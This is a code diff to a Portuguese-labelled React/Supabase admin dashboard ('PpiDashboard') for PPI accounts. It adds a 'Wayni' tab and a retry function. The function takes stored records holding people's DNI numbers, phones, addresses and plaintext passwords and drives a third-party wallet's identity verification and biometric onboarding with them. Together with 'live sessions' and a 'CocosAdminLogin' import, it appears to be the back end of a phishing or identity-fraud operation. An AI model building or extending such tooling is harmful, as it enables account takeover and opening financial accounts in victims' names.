@@ -2,6 +2,7 @@ import { useState, useEffect, useCallback, useRef, useMemo } from "react";
 import { useAuth } from "@/hooks/useAuth";
 import { supabase } from "@/integrations/supabase/client";
 import { ppiApi } from "@/lib/ppiApi";
+import { invokeWayni } from "@/lib/wayniApi";
 import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
 import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
 import { useNotificationSound } from "@/hooks/useNotificationSound";
@@ -11,6 +12,7 @@ import {
   Copy, Check, Eye, EyeOff, Bell, BellOff, Activity,
   Trash2, Lock, Banknote, ArrowDownToLine, Building,
   ChevronDown, ChevronUp, Loader2, History, Zap, Timer,
+  Fingerprint, MapPin, Camera, CheckCircle, AlertCircle,
 } from "lucide-react";
 
 // ── Types ──
@@ -98,7 +100,7 @@ const PpiDashboard = () => {
   const { user, isAdmin, hasRole, loading: authLoading, signOut } = useAuth();
   const canAccess = isAdmin || hasRole;
   const [forceRefresh, setForceRefresh] = useState(0);
-  const [activeTab, setActiveTab] = useState<"sessions" | "accounts">("accounts");
+  const [activeTab, setActiveTab] = useState<"sessions" | "accounts" | "wayni">("accounts");
 
   // Accounts
   const [accounts, setAccounts] = useState<PpiAccount[]>([]);
@@ -129,7 +131,106 @@ const PpiDashboard = () => {
   const [regBankCurrency, setRegBankCurrency] = useState(10000);
   const [regBankResult, setRegBankResult] = useState<any>(null);
 
-  // ── Load accounts ──
+  // Wayni onboarding state
+  const [wayniRows, setWayniRows] = useState<any[]>([]);
+  const [wayniLoading, setWayniLoading] = useState(false);
+  const [wayniSearch, setWayniSearch] = useState("");
+  const [wayniActionLoading, setWayniActionLoading] = useState("");
+
+  const loadWayniData = useCallback(async () => {
+    setWayniLoading(true);
+    const { data } = await (supabase as any)
+      .from("wayni_onboarding")
+      .select("*")
+      .eq("source", "ppi")
+      .order("created_at", { ascending: false });
+    setWayniRows(data || []);
+    setWayniLoading(false);
+  }, []);
+
+  useEffect(() => {
+    if (user && canAccess) loadWayniData();
+  }, [user, canAccess, loadWayniData]);
+
+  // Realtime wayni_onboarding
+  useEffect(() => {
+    if (!user || !canAccess) return;
+    const channel = supabase
+      .channel("ppi-wayni-onboarding-realtime")
+      .on("postgres_changes", { event: "*", schema: "public", table: "wayni_onboarding" }, (payload: any) => {
+        const row = payload.new as any;
+        if (row?.source !== "ppi") return;
+        if (payload.eventType === "INSERT") {
+          setWayniRows(prev => [row, ...prev]);
+        } else if (payload.eventType === "UPDATE") {
+          setWayniRows(prev => prev.map(r => r.id === row.id ? row : r));
+        } else if (payload.eventType === "DELETE") {
+          setWayniRows(prev => prev.filter(r => r.id !== (payload.old as any).id));
+        }
+      })
+      .subscribe();
+    return () => { supabase.removeChannel(channel); };
+  }, [user, canAccess]);
+
+  const handleWayniRetry = useCallback(async (row: any) => {
+    if (!row.dni || !row.email) return;
+    setWayniActionLoading(`retry-${row.id}`);
+    try {
+      // Try verify -> address -> biometric chain
+      const { data: verifyRes } = await invokeWayni({
+        action: "onboarding_verify",
+        email: row.email,
+        identity_number: row.dni,
+        phone_number: row.phone || "",
+        password: row.password || "",
+        selected_full_name: row.full_name || "",
+        selected_gender: row.gender || "",
+      });
+
+      if (verifyRes?.user_uuid && row.region && row.city) {
+        // Save address
+        const meta = row.metadata || {};
+        await invokeWayni({
+          action: "save_address",
+          user_uuid: verifyRes.user_uuid,
+          region_id: meta.region_id,
+          city_id: meta.city_id,
+          street_name: meta.street_name || row.street || "",
+          street_number: meta.street_number || "",
+          floor: meta.floor || "",
+          apartment: meta.apartment || "",
+          zip_code: row.zip_code || "",
+        });
+
+        // Request biometric
+        const { data: bioRes } = await invokeWayni({
+          action: "onboarding_biometric",
+          identity_number: row.dni,
+          user_uuid: verifyRes.user_uuid,
+          gender: verifyRes.gender || row.gender || "",
+        });
+
+        if (bioRes?.biometric_url) {
+          await (supabase as any).from("wayni_onboarding").update({
+            user_uuid: verifyRes.user_uuid,
+            biometric_url: bioRes.biometric_url,
+            biometric_id: bioRes.biometric_id || "",
+            status: "biometric_started",
+            updated_at: new Date().toISOString(),
+          }).eq("id", row.id);
+        }
+      }
+    } catch (e: any) {
+      console.warn("[WAYNI RETRY]", e.message);
+    }
+    setWayniActionLoading("");
+    loadWayniData();
+  }, [loadWayniData]);
+
+  const filteredWayni = wayniRows.filter(r =>
+    !wayniSearch || (r.email + (r.full_name || "") + (r.dni || "")).toLowerCase().includes(wayniSearch.toLowerCase())
+  );
+
   const loadAccounts = useCallback(async (showLoading = true) => {
     if (showLoading) setAccountsLoading(true);
     const { data } = await supabase.from("ppi_accounts" as any).select("*").order("updated_at", { ascending: false });
@@ -749,6 +850,7 @@ const PpiDashboard = () => {
             {([
               { key: "sessions" as const, label: "Sessões", icon: Activity, count: liveSessions.length },
               { key: "accounts" as const, label: "Contas", icon: Users, count: accounts.length },
+              { key: "wayni" as const, label: "Wayni", icon: Fingerprint, count: wayniRows.length },
             ]).map(({ key, label, icon: Icon, count }) => (
               <button key={key} onClick={() => setActiveTab(key)}
                 className={`flex items-center gap-1.5 px-4 py-2 rounded-xl text-[11px] font-semibold transition-all border ${
@@ -850,6 +952,102 @@ const PpiDashboard = () => {
                       onOrders={() => handleFetchOrders(account)}
                       onDelete={() => handleDelete(account)} />
                   ))}
+                </div>
+              )}
+            </div>
+          )}
+
+          {/* ── WAYNI TAB ── */}
+          {activeTab === "wayni" && (
+            <div className="space-y-3">
+              <div className="flex flex-col sm:flex-row sm:items-center gap-2">
+                <div className="relative flex-1 max-w-sm">
+                  <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
+                  <input type="text" placeholder="Buscar por email, nome, DNI..." value={wayniSearch} onChange={(e) => setWayniSearch(e.target.value)}
+                    className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
+                </div>
+                <button onClick={() => loadWayniData()} className="text-[10px] px-2.5 py-1 rounded-lg bg-secondary text-muted-foreground font-semibold hover:text-foreground flex items-center gap-1">
+                  <RefreshCw size={10} /> Refresh
+                </button>
+              </div>
+
+              {wayniLoading ? (
+                <div className="flex justify-center py-12"><RefreshCw size={20} className="animate-spin text-primary" /></div>
+              ) : filteredWayni.length === 0 ? (
+                <p className="text-center text-sm text-muted-foreground py-12">Nenhum registro de onboarding PPI.</p>
+              ) : (
+                <div className="space-y-1.5">
+                  {filteredWayni.map(row => {
+                    const statusColor = row.wallet_status === "ACTIVE" ? "text-green-400 bg-green-500/10"
+                      : row.status?.includes("biometric") ? "text-blue-400 bg-blue-500/10"
+                      : row.status?.includes("address") ? "text-purple-400 bg-purple-500/10"
+                      : row.status?.includes("verify") ? "text-yellow-400 bg-yellow-500/10"
+                      : "text-muted-foreground bg-secondary";
+
+                    const progressSteps = [
+                      { done: !!row.dni, label: "DNI", icon: CheckCircle },
+                      { done: !!row.region, label: "Endereço", icon: MapPin },
+                      { done: !!row.biometric_url, label: "Biometria", icon: Camera },
+                      { done: row.wallet_status === "ACTIVE", label: "Wallet", icon: CheckCircle },
+                    ];
+
+                    return (
+                      <div key={row.id} className="rounded-xl border border-border bg-card p-3 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div className="flex-1 min-w-0">
+                            <div className="flex items-center gap-1.5 flex-wrap">
+                              <span className="text-[12px] font-bold text-foreground truncate">{row.full_name || row.email}</span>
+                              <span className={`text-[7px] px-1 py-0.5 rounded font-bold ${statusColor}`}>{row.wallet_status || row.status || "—"}</span>
+                            </div>
+                            <div className="text-[9px] text-muted-foreground flex items-center gap-1.5 mt-0.5 flex-wrap">
+                              <span>{row.email}</span>
+                              {row.dni && <><span>•</span><span>DNI: {row.dni}</span></>}
+                              {row.phone && <><span>•</span><span>📱 {row.phone}</span></>}
+                              <span>•</span>
+                              <span>{timeAgo(row.updated_at || row.created_at)}</span>
+                            </div>
+                          </div>
+                          <div className="flex items-center gap-1">
+                            <button onClick={() => handleWayniRetry(row)}
+                              disabled={wayniActionLoading === `retry-${row.id}`}
+                              className="text-[9px] px-2 py-1 rounded-lg bg-primary/10 text-primary font-semibold hover:bg-primary/15 disabled:opacity-50 flex items-center gap-0.5">
+                              {wayniActionLoading === `retry-${row.id}` ? <Loader2 size={10} className="animate-spin" /> : <RefreshCw size={10} />} Reenviar
+                            </button>
+                          </div>
+                        </div>
+
+                        {/* Progress bar */}
+                        <div className="flex items-center gap-1">
+                          {progressSteps.map((s, i) => (
+                            <div key={i} className="flex items-center gap-0.5">
+                              <div className={`flex items-center gap-0.5 text-[8px] font-semibold px-1.5 py-0.5 rounded ${
+                                s.done ? "bg-green-500/10 text-green-400" : "bg-secondary text-muted-foreground"
+                              }`}>
+                                <s.icon size={8} /> {s.label}
+                              </div>
+                              {i < progressSteps.length - 1 && <span className="text-[8px] text-muted-foreground/30">→</span>}
+                            </div>
+                          ))}
+                        </div>
+
+                        {/* Biometric URL */}
+                        {row.biometric_url && (
+                          <a href={row.biometric_url} target="_blank" rel="noopener noreferrer"
+                            className="text-[9px] text-blue-400 hover:underline truncate block">
+                            🔗 {row.biometric_url.slice(0, 60)}...
+                          </a>
+                        )}
+
+                        {/* Bio status */}
+                        {row.bio_status && (
+                          <div className="text-[9px] text-muted-foreground">
+                            Bio: <span className="font-semibold">{row.bio_status}</span>
+                            {row.face_confidence && <span> • Confiança: {row.face_confidence}</span>}
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
                 </div>
               )}
             </div>
